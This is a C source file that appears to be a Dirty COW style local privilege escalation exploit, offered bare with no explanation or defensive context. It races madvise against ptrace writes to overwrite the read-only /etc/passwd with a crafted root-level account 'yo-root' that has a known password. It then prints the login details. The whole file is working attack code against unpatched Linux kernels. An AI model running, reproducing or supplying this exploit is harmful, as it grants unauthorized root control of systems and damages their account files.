#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *target_file = "/etc/passwd";
const char *hash_salt = "y0%y0";
const char *password = "yopass";

int file_descriptor;     
void *mapped_memory;     
pid_t process_id;        
pthread_t thread;        
struct stat file_info;   

struct UserDetails {
   char *username;
   char *password_hash;
   int user_id;
   int group_id;
   char *info;
   char *home_directory;
   char *shell;
};

char *format_passwd_entry(struct UserDetails user) 
{
  const char *template = "%s:%s:%d:%d:%s:%s:%s\n";  
  int size = snprintf(NULL, 0, template, user.username, user.password_hash, user.user_id, user.group_id, user.info, user.home_directory, user.shell);
  char *formatted_entry = malloc(size + 1);  

  sprintf(formatted_entry, template, user.username, user.password_hash, user.user_id, user.group_id, user.info, user.home_directory, user.shell);
  return formatted_entry;  
}

void *run_madvise(void *arg) 
{
  int counter = 0, result = 0;

  while(counter < 200000000) 
  {
    result += madvise(mapped_memory, 100, MADV_DONTNEED);  
    counter++;
  }
  printf("madvise call count: %d\n\n", result);  
}

int main() {

  struct UserDetails user;
  user.username = "yo-root";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "doubt>1:40";
  user.home_directory = "/root";
  user.shell = "/bin/bash";

  user.password_hash = crypt(password, hash_salt);
  char *passwd_line = format_passwd_entry(user); 

  file_descriptor = open(target_file, O_RDONLY);
  fstat(file_descriptor, &file_info);  
  mapped_memory = mmap(NULL, file_info.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, file_descriptor, 0);

  process_id = fork();
  if(process_id) {

    waitpid(process_id, NULL, 0);
    int u = 0, i = 0, o = 0, count = 0;
    int length = strlen(passwd_line);  

    while (i < 10000 / length) {
      o = 0;
      while (o < length) {
        u = 0;
        while (u < 10000) {
          count += ptrace(PTRACE_POKETEXT, process_id, mapped_memory + o, *((long*)(passwd_line + o)));
          u++;
        }
        o++;
      }
      i++;
    } 
  } else {

    pthread_create(&thread, NULL, run_madvise, NULL);
    ptrace(PTRACE_TRACEME);  
    kill(getpid(), SIGSTOP);  
    pthread_join(thread, NULL);  
  }

  printf("completed! Verify the changes in %s.\n", target_file);  
  printf("you can now log in with username: '%s' and the password %s.\n\n", user.username, password);  
  return 0;  
}